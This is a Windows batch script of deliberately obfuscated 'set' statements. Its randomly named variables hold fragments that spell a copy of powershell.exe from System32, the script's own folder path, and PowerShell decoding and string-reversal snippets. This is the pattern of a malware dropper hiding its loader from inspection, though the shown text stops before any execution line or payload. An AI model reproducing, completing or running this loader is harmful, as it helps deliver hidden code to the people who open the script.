@echo off
set "cDGiEpCsXH=\W"
set "SdBWARoWDs=he"
set "igiECoYczz=do"
set "wgMpHvLmyo= /"
set "dZckBJXUNa=ll"
set "CEIlkhQdlP=:\"
set "vXXIFmouOq=32"
set "naLUWxEtTG=ws"
set "XwFbfQzwvZ= C"
set "xpMYJqpKrX=in"
set "piawOSAULu=.e"
set "HvDRNmVVsg=nd"
set "cCNEpqLyHZ=\v"
set "VGijoPHEsX=rs"
set "IBWyXDUefY=co"
set "zJeajjimwP=po"
set "LWQLfDkhhw=he"
set "HcprXbqJzj=py"
set "cVqRHKdeiH=y "
set "lnxJjTQXYK=s\"
set "BsXNCbNrLD=1."
set "REWawgkYZo=Po"
set "MnUjlrxIWK=0\"
set "exIfwduehQ=ow"
set "SLAiUKcpIA=we"
set "XEcRhWvcFp=we"
set "CEUzWOkDIc=xe"
set "rATytwESbm=rS"
set "akBxWuXUHT=em"
set "aeGHdvpInh=Wi"
set "SAVWLaMLoA=ll"
set "mVKeLCvAlZ=st"
set "BRiorgaQxY=Sy"
set "bUYyNjqsYs= %~dp0"
set "NczboTmwDR=cd"
set "aLEpJyPgGd= = $"
set "BoKDyNPFnL=V = "
set "lQMbwDTCPh=raph"
set "wiAYyoLXys=pLlk"
set "BHkSCYsWsr=ionM"
set "VygoodxpyD=, (,"
set "yKlzHfjHpM=n ''"
set "RppGRXZKYF=ring"
set "ijPvAcqUNf=[Sys"
set "AgDgPeNJBH=ert]"
set "jpeADvamsS='[-1"
set "AViDZQfvYF=-1.."
set "GjQaINbtPv=);$I"
set "eTUwonFdQP=oArr"
set "LAAyvWUhEV=UGTu"
